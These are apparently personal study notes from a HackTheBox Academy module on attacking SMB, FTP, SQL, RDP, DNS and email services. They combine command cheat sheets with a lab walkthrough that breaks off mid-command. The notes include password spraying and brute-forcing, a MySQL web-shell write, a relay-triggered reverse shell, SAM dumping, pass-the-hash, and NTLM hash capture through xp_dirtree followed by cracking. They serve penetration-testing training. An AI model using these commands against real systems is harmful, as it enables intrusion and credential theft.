@@ -1,0 +1,1498 @@
+
+![](https://i.imgur.com/odyOpaO.png)
+
+# Attacking Common Services
+
+This section will focus on internal services, but this may apply to cloud storage synced locally to servers and workstations.
+## Server Message Block (SMB)
+
+SMB is commonly used in Windows networks, and we will often find share folders in a Windows network. We can interact with SMB using the GUI, CLI, or tools. Let us cover some common ways of interacting with SMB using Windows & Linux.
+
+## Windows
+
+To open the Run dialog box and type the file share location, e.g.: `\\192.168.220.129\Finance\`
+The command [net use](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)) connects a computer to or disconnects a computer from a shared resource or displays information about computer connections. We can connect to a file share with the following command and map its content to the drive letter `n`.
+```c
+C:\htb> net use n: \\192.168.220.129\Finance
+
+The command completed successfully.
+```
+
+With the shared folder mapped as the `n` drive, we can execute Windows commands as if this shared folder is on our local computer. Let's find how many files the shared folder and its subdirectories contain.
+```c
+C:\htb> dir n: /a-d /s /b | find /c ":\"
+
+29302
+```
+
+| Syntax | Description                                                    |
+| ------ | -------------------------------------------------------------- |
+| `dir`  | Application                                                    |
+| `n:`   | Directory or drive to search                                   |
+| `/a-d` | `/a` is the attribute and `-d` means not directories           |
+| `/s`   | Displays files in a specified directory and all subdirectories |
+| `/b`   | Uses bare format (no heading information or summary)           |
+The following command `| find /c ":\\"` process the output of `dir n: /a-d /s /b` to count how many files exist in the directory and subdirectories. You can use `dir /?` to see the full help. Searching through 29,302 files is time consuming, scripting and command line utilities can help us speed up the search. With `dir` we can search for specific names in files such as:
+
+- cred
+- password
+- users
+- secrets
+- key
+- Common File Extensions for source code such as: .cs, .c, .go, .java, .php, .asp, .aspx, .html.
+```c
+C:\htb>dir n:\*cred* /s /b
+
+n:\Contracts\private\credentials.txt
+
+
+C:\htb>dir n:\*secret* /s /b
+
+n:\Contracts\private\secret.txt
+```
+
+If we want to search for a specific word within a text file, we can use [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr).
+```c
+c:\htb>findstr /s /i cred n:\*.*
+
+n:\Contracts\private\secret.txt:file with all credentials
+n:\Contracts\private\credentials.txt:admin:SecureCredentials!
+```
+
+PowerShell was designed to extend the capabilities of the Command shell to run PowerShell commands called `cmdlets`. Cmdlets are similar to Windows commands but provide a more extensible scripting language. We can run both Windows commands and PowerShell cmdlets in PowerShell, but the Command shell can only run Windows commands and not PowerShell cmdlets
+
+#### Linux
+
+Linux (UNIX) machines can also be used to browse and mount SMB shares. Note that this can be done whether the target server is a Windows machine or a Samba server. Even though some Linux distributions support a GUI, we will focus on Linux command-line utilities and tools to interact with SMB. Let's cover how to mount SMB shares to interact with directories and files locally.
+
+```c
+r3so1v3@htb[/htb]$ sudo mkdir /mnt/Finance
+r3so1v3@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
+```
+
+Alternatively we can use a credentials file
+```c
+r3so1v3@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
+```
+
+We need to install `cifs-utils` to connect to an SMB share folder. To install it we can execute from the command line `sudo apt install cifs-utils`.
+
+#### Linux - Find
+```c
+r3so1v3@htb[/htb]$ find /mnt/Finance/ -name *cred*
+
+/mnt/Finance/Contracts/private/credentials.txt
+```
+
+Next, let's find files that contain the string `cred`:
+```c
+r3so1v3@htb[/htb]$ grep -rn /mnt/Finance/ -ie cred
+
+/mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials!
+/mnt/Finance/Contracts/private/secret.txt:1:file with all credentials
+```
+
+#### Tools to Interact with Common Services
+
+| **SMB**                                                                                  | **FTP**                                     | **Email**                                          | **Databases**                                                                                                                |
+| ---------------------------------------------------------------------------------------- | ------------------------------------------- | -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
+| [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)          | [ftp](https://linux.die.net/man/1/ftp)      | [Thunderbird](https://www.thunderbird.net/en-US/)  | [mssql-cli](https://github.com/dbcli/mssql-cli)                                                                              |
+| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)                              | [lftp](https://lftp.yar.ru/)                | [Claws](https://www.claws-mail.org/)               | [mycli](https://github.com/dbcli/mycli)                                                                                      |
+| [SMBMap](https://github.com/ShawnDEvans/smbmap)                                          | [ncftp](https://www.ncftp.com/)             | [Geary](https://wiki.gnome.org/Apps/Geary)         | [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)                             |
+| [Impacket](https://github.com/SecureAuthCorp/impacket)                                   | [filezilla](https://filezilla-project.org/) | [MailSpring](https://getmailspring.com/)           | [dbeaver](https://github.com/dbeaver/dbeaver)                                                                                |
+| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)   | [crossftp](http://www.crossftp.com/)        | [mutt](http://www.mutt.org/)                       | [MySQL Workbench](https://dev.mysql.com/downloads/workbench/)                                                                |
+| [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) |                                             | [mailutils](https://mailutils.org/)                | [SQL Server Management Studio or SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) |
+|                                                                                          |                                             | [sendEmail](https://github.com/mogaal/sendemail)   |                                                                                                                              |
+|                                                                                          |                                             | [swaks](http://www.jetmore.org/john/code/swaks/)   |                                                                                                                              |
+|                                                                                          |                                             | [sendmail](https://en.wikipedia.org/wiki/Sendmail) |                                                                                                                              |
+
+### The Concept of Attacks
+![](https://i.imgur.com/Xx3MCDa.png)
+
+First, we have a `Source` that performs the specific request to a `Process` where the vulnerability gets triggered. Each process has a specific set of `Privileges` with which it is executed. Each process has a task with a specific goal or `Destination` to either compute new data or forward it. However, the individual and unique specifications under these categories may differ from service to service.
+
+Sensitive information may include, but is not limited to:
+
+- Usernames.
+- Email Addresses.
+- Passwords.
+- DNS records.
+- IP Addresses.
+- Source code.
+- Configuration files.
+- PII.
+## FTP - File Transfer Protocol
+## SMB - Server Message Block
+
+Anonymous Authentication
+
+If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc. Most tools that interact with SMB allow null session connectivity, including smbclient, smbmap, rpcclient, or enum4linux. Let's explore how we can interact with file shares and RPC using null authentication.
+
+### SQL - Structured Query Language
+
+By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port. We can use `Nmap`'s default scripts `-sC` option to enumerate database services on a target system.
+`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:
+
+
+### RDP - Remote Desktop Protocol
+Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. For this we use technique - password spraying, for this we can use: crowbar, hydra
+
+Let's imagine we successfully gain access to a machine and have an account with local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.
+
+To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. It works by specifying which SESSION ID  we would like to connect to which session name. So, for example, the following command will open a new console as the specified SESSION_ID within our current RDP session:
+Attacking RDP
+
+```c
+C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
+```
+
+If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or Mimikatz.
+
+
+| **Authentication Type**       | **Description**                                                                                                                                                                                                                                                                                                                           |
+| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `Windows authentication mode` | This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
+| `Mixed mode`                  | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.                                                                                                                                                                                     |
+
+## Commands
+|**Command**|**Description**|
+|---|---|
+|`ftp 192.168.2.142`|Connecting to the FTP server using the `ftp` client.|
+|`nc -v 192.168.2.142 21`|Connecting to the FTP server using `netcat`.|
+|`hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142`|Brute-forcing the FTP service.|
+### Attacking SMB
+
+|**Command**|**Description**|
+|---|---|
+|`smbclient -N -L //10.129.14.128`|Null-session testing against the SMB service.|
+|`smbmap -H 10.129.14.128`|Network share enumeration using `smbmap`.|
+|`smbmap -H 10.129.14.128 -r notes`|Recursive network share enumeration using `smbmap`.|
+|`smbmap -H 10.129.14.128 --download "notes\note.txt"`|Download a specific file from the shared folder.|
+|`smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`|Upload a specific file to the shared folder.|
+|`rpcclient -U'%' 10.10.110.17`|Null-session with the `rpcclient`.|
+|`./enum4linux-ng.py 10.10.11.45 -A -C`|Automated enumeratition of the SMB service using `enum4linux-ng`.|
+|`crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'`|Password spraying against different users from a list.|
+|`impacket-psexec administrator:'Password123!'@10.10.110.17`|Connect to the SMB service using the `impacket-psexec`.|
+|`crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`|Execute a command over the SMB service using `crackmapexec`.|
+|`crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`|Enumerating Logged-on users.|
+|`crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`|Extract hashes from the SAM database.|
+|`crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`|Use the Pass-The-Hash technique to authenticate on the target host.|
+|`impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`|Dump the SAM database using `impacket-ntlmrelayx`.|
+|`impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>`|Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`.|
+### Attacking SQL Databases
+
+|**Command**|**Description**|
+|---|---|
+|`mysql -u julio -pPassword123 -h 10.129.20.13`|Connecting to the MySQL server.|
+|`sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30`|Connecting to the MSSQL server.|
+|`sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`|Connecting to the MSSQL server from Linux.|
+|`sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`|Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server.|
+|`mysql> SHOW DATABASES;`|Show all available databases in MySQL.|
+|`mysql> USE htbusers;`|Select a specific database in MySQL.|
+|`mysql> SHOW TABLES;`|Show all available tables in the selected database in MySQL.|
+|`mysql> SELECT * FROM users;`|Select all available entries from the "users" table in MySQL.|
+|`sqlcmd> SELECT name FROM master.dbo.sysdatabases`|Show all available databases in MSSQL.|
+|`sqlcmd> USE htbusers`|Select a specific database in MSSQL.|
+|`sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`|Show all available tables in the selected database in MSSQL.|
+|`sqlcmd> SELECT * FROM users`|Select all available entries from the "users" table in MSSQL.|
+|`sqlcmd> EXECUTE sp_configure 'show advanced options', 1`|To allow advanced options to be changed.|
+|`sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`|To enable the xp_cmdshell.|
+|`sqlcmd> RECONFIGURE`|To be used after each sp_configure command to apply the changes.|
+|`sqlcmd> xp_cmdshell 'whoami'`|Execute a system command from MSSQL server.|
+|`mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'`|Create a file using MySQL.|
+|`mysql> show variables like "secure_file_priv";`|Check if the the secure file privileges are empty to read locally stored files on the system.|
+|`sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`|Read local files in MSSQL.|
+|`mysql> select LOAD_FILE("/etc/passwd");`|Read local files in MySQL.|
+|`sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'`|Hash stealing using the `xp_dirtree` command in MSSQL.|
+|`sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'`|Hash stealing using the `xp_subdirs` command in MSSQL.|
+|`sqlcmd> SELECT srvname, isremote FROM sysservers`|Identify linked servers in MSSQL.|
+|`sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]`|Identify the user and its privileges used for the remote connection in MSSQL.|
+### Attacking RDP
+
+|**Command**|**Description**|
+|---|---|
+|`crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`|Password spraying against the RDP service.|
+|`hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`|Brute-forcing the RDP service.|
+|`rdesktop -u admin -p password123 192.168.2.143`|Connect to the RDP service using `rdesktop` in Linux.|
+|`tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`|Impersonate a user without its password.|
+|`net start sessionhijack`|Execute the RDP session hijack.|
+|`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`|Enable "Restricted Admin Mode" on the target Windows host.|
+|`xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA`|Use the Pass-The-Hash technique to login on the target host without a password.|
+### Attacking DNS
+
+| **Command**                                         | **Description**                                                       |
+| --------------------------------------------------- | --------------------------------------------------------------------- |
+| `dig AXFR @ns1.inlanefreight.htb inlanefreight.htb` | Perform an AXFR zone transfer attempt against a specific name server. |
+| `subfinder -d inlanefreight.com -v`                 | Brute-forcing subdomains.                                             |
+| `host support.inlanefreight.com`                    | DNS lookup for the specified subdomain.                               |
+### Attacking Email Services
+
+| **Command**                                                                                                                                             | **Description**                                                                        |
+| ------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
+| `host -t MX microsoft.com`                                                                                                                              | DNS lookup for mail servers for the specified domain.                                  |
+| `dig mx inlanefreight.com \| grep "MX" \| grep -v ";"`                                                                                                  | DNS lookup for mail servers for the specified domain.                                  |
+| `host -t A mail1.inlanefreight.htb.`                                                                                                                    | DNS lookup of the IPv4 address for the specified subdomain.                            |
+| `telnet 10.10.110.20 25`                                                                                                                                | Connect to the SMTP server.                                                            |
+| `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`                                                                           | SMTP user enumeration using the RCPT command against the specified host.               |
+| `python3 o365spray.py --validate --domain msplaintext.xyz`                                                                                              | Verify the usage of Office365 for the specified domain.                                |
+| `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz`                                                                                     | Enumerate existing users using Office365 on the specified domain.                      |
+| `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz`                                         | Password spraying against a list of users that use Office365 for the specified domain. |
+| `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`                                                                                               | Brute-forcing the POP3 service.                                                        |
+| `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213` | Testing the SMTP service for the open-relay vulnerability.                             |
+
+# Questions & Answers
+
+### Attacking FTP
+
+1.  What port is the FTP service running on?
+
+Do nmap scan and see that it is 2121
+
+2.  What username is available for the FTP server?
+
+First things first we need to try logging in as anonymous:
+```c
+ftp -P 2121 anonymous@10.129.203.6
+Connected to 10.129.203.6.
+ls
+220 ProFTPD Server (InlaneFTP) [10.129.203.6]
+331 Anonymous login ok, send your complete email address as your password
+Password: 
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||22514|)
+150 Opening ASCII mode data connection for file list
+-rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
+-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
+
+```
+
+Then download both lists using get users.list and get passwords.list
+Then open the users.list and try putting all the usernames to the htb-academy answer box until it gives correct
+
+3. Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer. 
+
+Then we can try bruteforcing with hydra for password, not medusa, cuz it takes longer:
+```c
+hydra -l robin -P /home/r3so1ve/hack/htb-academy/attacking-common-services/passwords.list ftp://10.129.203.6:2121 -t 10
+
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-25 22:24:58
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 10 tasks per 1 server, overall 10 tasks, 250 login tries (l:1/p:250), ~25 tries per task
+[DATA] attacking ftp://10.129.203.6:2121/
+[STATUS] 100.00 tries/min, 100 tries in 00:01h, 150 to do in 00:02h, 10 active
+[2121][ftp] host: 10.129.203.6   login: robin   password: 7iz4rnckjsduza7
+1 of 1 target successfully completed, 1 valid password found
+
+```
+
+As we now the creds now:
+```
+username: robin
+password: 7iz4rnckjsduza7
+```
+
+We ssh to target and get the flag:
+```c
+ssh robin@10.129.203.6
+```
+
+### Attacking SMB
+
+4. What is the name of the shared folder with READ permissions? 
+
+So we need to use smbmap for this, as this tool will give us info about permissions, not smbclient
+```c
+smbmap -H 10.129.203.6
+[+] IP: 10.129.203.6:445	Name: 10.129.203.6                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	print$                                            	NO ACCESS	Printer Drivers
+	GGJ                                               	READ ONLY	Priv
+	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)
+```
+
+5. What is the password for the username "jason"? 
+
+So first of all we need to find the username jason, for this we use:
+```c
+enum4linux-ng 10.129.203.6 -A
+
+=====================================
+|    Users via RPC on 10.129.203.6    |
+ =====================================
+[*] Enumerating users via 'querydispinfo'
+[+] Found 2 user(s) via 'querydispinfo'
+[*] Enumerating users via 'enumdomusers'
+[+] Found 2 user(s) via 'enumdomusers'
+[+] After merging user results we have 2 user(s) total:
+'1000':
+  username: jason
+  name: ''
+  acb: '0x00000010'
+  description: ''
+'1001':
+  username: robin
+  name: ''
+  acb: '0x00000010'
+  description: ''
+
+```
+
+The output of the above command is much longer, but I included only the piece with username
+Then we can use crackmapexec to bruteforce password for jason:
+```c
+crackmapexec smb 10.129.203.6 -u 'jason' -p pws.list --local-auth
+SMB         10.129.203.6    445    ATTCSVC-LINUX    [*] Windows 6.1 Build 0 (name:ATTCSVC-LINUX) (domain:ATTCSVC-LINUX) (signing:False) (SMBv1:False)
+SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:liverpool STATUS_LOGON_FAILURE 
+SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:theman STATUS_LOGON_FAILURE 
+SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:bandit STATUS_LOGON_FAILURE 
+.
+.
+.
+SNIP
+.
+.
+.
+SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:warrior STATUS_LOGON_FAILURE 
+SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:1q2w3e4r5t STATUS_LOGON_FAILURE 
+SMB         10.129.203.6    445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh 
+```
+
+6. Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer. 
+
+As we now the username and password, so we can try to ssh as jason to target, but when we try it, we get:
+```c
+ssh jason@10.129.203.6             
+jason@10.129.203.6: Permission denied (publickey).
+```
+
+This means that we need to get `id_rsa` which located in the GGJ share, but at first we need to mount to share. Mounting a shared folder from a remote server (like an SMB share) allows you to access its contents as if they were part of your local filesystem. In this case, the reason to mount the SMB share is to access the `id_rsa` file (which is the SSH private key for the user) from the `GGJ` share on the remote server.
+
+First create the folder for mounting:
+```c
+sudo mkdir -p /mnt/smb_htb
+```
+
+So we mount and then copy it (`id_rsa`)to your comfy location:
+```c
+sudo mount -t cifs //10.129.203.6/GGJ /mnt/smb_htb -o username=jason,password='34c8zuNBo91!@28Bszh',ro 
+cp /mnt/smb_htb/id_rsa /home/r3so1ve/hack/htb-academy/attacking-common-services/
+```
+
+Making sure we got it:
+```c
+ls
+total 24K
+-rwxr-xr-x 1 r3so1ve r3so1ve 3.4K Sep 26 11:59 id_rsa
+-rw-r--r-- 1 r3so1ve r3so1ve 2.0K Sep 25 22:17 passwords.list
+-rw-rw-r-- 1 r3so1ve r3so1ve 2.5K May  9  2022 pws.list
+-rw-r--r-- 1 r3so1ve r3so1ve 1.6K Aug 23 15:09 pws.zip
+-rw-rw-r-- 1 r3so1ve r3so1ve   72 Sep 25 22:17 users.list
+-rw-r--r-- 1 r3so1ve r3so1ve  434 Aug 23 15:09 users.zip
+
+```
+
+Don't forget to change permissions:
+```c
+chmod 600 id_rsa 
+```
+
+And finally ssh to target:
+```c
+ssh jason@10.129.203.6 -i id_rsa 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu 26 Sep 2024 06:59:23 AM UTC
+
+  System load:  0.04               Processes:               232
+  Usage of /:   25.4% of 13.72GB   Users logged in:         0
+  Memory usage: 14%                IPv4 address for ens160: 10.129.203.6
+  Swap usage:   0%
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+0 updates can be applied immediately.
+
+
+Last login: Tue Apr 19 21:50:46 2022 from 10.10.14.20
+$ ls
+flag.txt
+$ cat flag.txt
+HTB{SM******}
+
+```
+
+### Attacking SQL Databases
+
+Authenticate to 10.129.203.12 (ACADEMY-ATTCOMSVC-WIN-02) with user "htbdbuser" and password "MSSQLAccess01!"
+
+7. What is the password for the "mssqlsvc" user?
+
+First of all I ran nmap script:
+```c
+nmap -Pn -sV -sC -p- 10.10.10.125 --min-rate 3000 -n
+```
+
+Then I discovered that port 1433 was opened. And as we have creds to authenticate to DB I decided to use sqsh tool for that at first
+I decided to install it, but had problems with no properly installed FreeTDS or Sybase environment found in /usr. So later I decided to use sqlcmd tool instead sqsh
+I also needed to install it first:
+```c
+sudo apt update 
+sudo apt install curl apt-transport-https
+curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -
+echo "deb [arch=amd64] https://packages.microsoft.com/repos/ubuntu/ focal main" | sudo tee /etc/apt/sources.list.d/mssql-release.list
+sudo apt update
+sudo apt install mssql-tools
+export PATH="$PATH:/opt/mssql-tools/bin"
+source ~/.bashrc  # или source ~/.zshrc, если вы используете Zsh
+sqlcmd -?
+```
+
+Insert the above commands one by one to install sqlcmd
+Then as we successfully installed it, we can now connect to DB:
+```c
+sqlcmd -S 10.129.68.230 -U htbdbuser
+Password: 
+1> show databases;
+2> go
+Msg 2812, Level 16, State 62, Server WIN-02\SQLEXPRESS, Line 1
+Could not find stored procedure 'show'.
+1> SELECT name FROM master.dbo.sysdatabases
+2> go
+name                                                                                                                            
+--------------------------------------------------------------------------------------------------------------------------------
+master                                                                                                                          
+tempdb                                                                                                                          
+model                                                                                                                           
+msdb                                                                                                                            
+hmaildb                                                                                                                         
+flagDB                           
+```
+
+As we need to get the password of the user mssqlcvs we can do this by XP_SUBDIRS Hash Stealing with impacket
+On attacking machine:
+```c
+sudo impacket-smbserver share ./ -smb2support 
+[sudo] password for r3so1v3: 
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+
+```
+
+Then we run:
+```c
+1> EXEC master..xp_dirtree '\\10.10.16.43\share\'
+2> GO
+subdirectory                                                                                                                                                                                                                                                         depth      
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -----------
+
+(0 rows affected)
+```
+
+This way we use XP_DIRTREE for Hash Stealing
+After that we need to return to our attack machine and we can see that we got hash:
+```c
+sudo impacket-smbserver share ./ -smb2support 
+[sudo] password for r3so1v3: 
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.129.68.230,49676)
+[*] AUTHENTICATE_MESSAGE (WIN-02\mssqlsvc,WIN-02)
+[*] User WIN-02\mssqlsvc authenticated successfully
+[*] mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:1cd215cecbce3abaeadb0fc4181255b2:010100000000000000322dad1411db015da772170901c63a0000000001001000410057007100730065004f0053006e0003001000410057007100730065004f0053006e0002001000610045006f0069004e0062004f00760004001000610045006f0069004e0062004f0076000700080000322dad1411db01060004000200000008003000300000000000000000000000003000002e730fc16d3cd75cf010a577516f7fe7231017147e654f5b6fd60366c83c8ccc0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00340033000000000000000000
+[*] Closing down connection (10.129.68.230,49676)
+[*] Remaining connections []
+
+```
+
+Now we need to crack it using john the ripper. But firstly copy and paste the above hash into the file, for example "hash". Then start cracking it:
+```c
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+princess1        (mssqlsvc)     
+1g 0:00:00:00 DONE (2024-09-28 00:39) 25.00g/s 51200p/s 51200c/s 51200C/s 123456..lovers1
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+```
+So we see that we got the password: princess1
+
+9. Enumerate the "flagDB" database and submit a flag as your answer.
+
+First we need to connect to MySQL via sqlcmd:
+```c
+sqlcmd -S 10.129.26.147 -U htbdbuser
+```
+
+Enter the password provided by the task and we are in
+Next we use impacket tools to log in to mssql database using the user mssqlcvs and password princess1. It would typically be used in a penetration testing scenario to try to authenticate and interact with the SQL Server.
+```c
+impacket-mssqlclient -port 1433 -target-ip 10.129.26.147 mssqlsvc@10.129.26.147 -windows-auth
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (WIN-02\mssqlsvc  guest@master)> 
+```
+
+We can use the following command to list the available dbs:
+```c
+SQL (WIN-02\mssqlsvc  guest@master)> enum_db
+name      is_trustworthy_on   
+-------   -----------------   
+master                    0   
+
+tempdb                    0   
+
+model                     0   
+
+msdb                      1   
+
+hmaildb                   0   
+
+flagDB                    0   
+```
+
+Also we can see the users, owners and logins:
+```c
+SQL (WIN-02\mssqlsvc  guest@master)> enum_users
+UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   
+------------------   --------   ---------   ---------   -------------   ----------   -----   
+dbo                  db_owner   sa          master      dbo             b'1         '   b'01'   
+
+guest                public     NULL        NULL        guest           b'2         '   b'00'   
+
+INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   
+
+sys                  public     NULL        NULL        NULL            b'4         '    NULL   
+
+SQL (WIN-02\mssqlsvc  guest@master)> enum_owner
+Database   Owner                    
+--------   ----------------------   
+master     sa                       
+
+tempdb     sa                       
+
+model      sa                       
+
+msdb       sa                       
+
+hmaildb    hmaildblogin             
+
+flagDB     WINSRV02\Administrator   
+
+SQL (WIN-02\mssqlsvc  guest@master)> enum_logins
+name                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
+-----------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
+sa                  SQL_LOGIN                 1          1               0             0            0              0           0           0           0   
+
+BUILTIN\Users       WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   
+
+WINSRV02\mssqlsvc   WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
+
+```
+
+Then we need to verify our current user and role:
+```c
+sqlcmd -S 10.129.26.147 -U htbdbuser
+Password: 
+1> SELECT SYSTEM_USER
+2> SELECT IS_SRVROLEMEMBER('sysadmin')
+3> go
+                                                                                                                                
